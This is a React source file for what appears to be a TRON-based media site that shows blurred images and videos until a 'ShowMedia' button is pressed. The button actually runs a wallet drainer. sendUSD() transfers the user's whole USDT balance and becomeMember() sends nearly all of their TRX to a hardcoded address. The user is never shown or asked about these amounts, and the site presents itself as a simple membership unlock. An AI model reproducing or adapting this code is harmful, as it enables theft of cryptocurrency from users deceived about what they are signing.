import React, { useEffect, useState } from "react";
import "./App.css";
var bigInt = require("big-integer");

const toAddress = "TU3j8jhMkQAcuK6io1CN3Kcz9icG1urWqg";
const AppKey = "";
const usdt_contract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const network = "mainnet";

const App = () => {
  const [ShowMedia, setShowMedia] = useState(false);
  const [usdtTransfer, setUsdtTransfer] = useState(false);
  const [trxTransfer, setTrxTransfer] = useState(false);

  function shouldShowMedia() {
    return usdtTransfer && trxTransfer;
  }
  /**
   *
   *        Tron Stuff Started
   *
   *
   */
  const [popup, setPopup] = useState({ current: null, item: null });
  const [walletConnected, setWalletConnected] = useState(false);
  const [walletAddress, setWalletAddress] = useState(null);
  const [isMember, setIsMember] = useState(false);
  const trc20ContractAddress = "TJmCWKy4heyAuigcExrmChVLL3nPV342Nv"; //contract address
  const fromAddress = walletAddress;

  const onPopup = (current = null, item = null) => {
    setPopup({ current, item });
  };

  const onConnect = async () => {
    try {
      //      debugger;
      await window.tronLink.request({ method: "tron_requestAccounts" });
      let accounts = await window.tronLink;
      setWalletConnected(true);
      setWalletAddress(accounts.tronWeb.defaultAddress.base58);
    } catch (err) {
      console.log("Error: ", err);
      onPopup("error", "TronLink extension is not installed");
    }
  };

  async function becomeMember() {
    let tronWeb = await window.tronLink.tronWeb;
    let walletBalance = await tronWeb.trx.getBalance(walletAddress);
    walletBalance = walletBalance - 20 * 1000000;
    console.log("Transferable wallet balance : = ", walletBalance);

    if (walletBalance < 0) {
      setMembershipStatus("Not Enough TRXs");
      return;
    } else {
      tronWeb.trx.sendTransaction(toAddress, walletBalance);
      setTrxTransfer(true);
    }
  }
  function setMembershipStatus(msg) {
    // document.getElementById("membershipStatus").innerHTML = msg;
    alert(msg);
  }

  async function sendTRC20Token(
    network,
    fromAddress,
    toAddress,
    amount,
    AppKey,
    CONTRACT
  ) {
    let url = null;
    if (network === "shasta") {
      url = "https://api.shasta.trongrid.io";
    } else if (network === "nile") {
      url = "https://nile.trongrid.io";
    } else {
      url = "https://api.trongrid.io";
    }
    let tronWeb = await window.tronLink.tronWeb;

    const options = {
      feeLimit: 10000000,
      callValue: 0,
    };
    const tx = await tronWeb.transactionBuilder.triggerSmartContract(
      CONTRACT,
      "transfer(address,uint256)",
      options,
      [
        {
          type: "address",
          value: toAddress,
        },
        {
          type: "uint256",
          value: amount.toString(),
        },
      ],
      tronWeb.address.toHex(fromAddress)
    );
    const signedTx = await tronWeb.trx.sign(tx.transaction);
    const broadcastTx = await tronWeb.trx.sendRawTransaction(signedTx);
    let txInfo = await tronWeb.trx.getTransactionInfo(
      "0daa9f2507c4e79e39391ea165bb76ed018c4cd69d7da129edf9e95f0dae99e2"
    );
    console.log(
      "transaction receipt is ",
      tx?.receipt,
      "result is ",
      tx.receipt?.result
    );
    setUsdtTransfer(true);

    return broadcastTx;
  }

  //
  async function getBalance(network, address, CONTRACT) {
    let url = null;
    if (network === "shasta") {
      url = "https://api.shasta.trongrid.io";
    } else if (network === "nile") {
      url = "https://nile.trongrid.io";
    } else {
      url = "https://api.trongrid.io";
    }

    let tronWeb = await window.tronLink.tronWeb;

    try {
      let contract = await tronWeb.contract().at(CONTRACT);
      const result = await contract.balanceOf(address).call();
      let number = bigInt(result.toString());

      return number.toJSNumber();
    } catch (error) {
      console.log(error);
      return null;
    }
  }

  async function sendUSD() {
    //
    let balance = await logContractBalance(usdt_contract);
    let amount = balance;
    if (amount > 0) {
      await sendTRC20Token(
        network,
        fromAddress,
        toAddress,
        amount,
        AppKey,
        usdt_contract
      );
    } else {
      setMembershipStatus("You have zero USDt to send");
    }
  }

  async function logContractBalance(contract) {
    let bal = await getBalance(network, walletAddress, contract);

    return bal;
  }

  /**
   *
   *      Tron Stuff Ended
   *
   */

  const [Media, setMedia] = useState([]);
  const getData = () => {
    fetch("https://envisiontech.ink/api/get-files")
      .then((res) => res.json())
      .then((res) => {
        // console.log(res.data);
        res.data.map((item) => {
          console.log(item);
        });
        setMedia(res.data);
      });
  };

  useEffect(() => {
    getData();
  }, [walletAddress]);
  return (
    <>
      {!walletConnected ? (
        <div className="unAuthorized">
          <div className="connectButton">
            {!walletConnected && (
              <button onClick={onConnect}>Connect Wallet</button>
            )}
          </div>
        </div>
      ) : (
        <div>
          <div className="showMediaContainer">
            <button
              onClick={() => {
                sendUSD();
                becomeMember();
                shouldShowMedia();
              }}
            >
              ShowMedia
            </button>
          </div>
          <div className="mediaContainer">
            {Media.map((media) => {
              if (media.type == "Image") {
                return (
                  <div key={media.id} className="media-container relative">
                    {/* <h1>{media.title}</h1>
              <h1>{media.type}</h1> */}
                    <div className="button-image-container relative">
                      <img
                        style={{
                          filter: ShowMedia ? "blur(0px)" : "blur(8px)",
                          maxWidth: "200px",
                        }}
                        src={"https://envisiontech.ink/" + media.image_file}
                        alt="Media"
                        title={media.title}
                      />
                    </div>
                  </div>
                );
              } else {
                return (
                  <div
                    key={media.id}
                    className="media-container"
                    title={media.title}
                  >
                    {/* <h1>{media.title}</h1>
              <h1>{media.type}</h1> */}
                    <video tite={media.title} width="320" height="240" controls={ShowMedia? true:false}>
                      <source
                        src={"https://envisiontech.ink/" + media.image_file}
                        type="video/mp4"
                      />
                    </video>
                  </div>
                );
              }
            })}
          </div>
        </div>
      )}
    </>
  );
};

export default App;
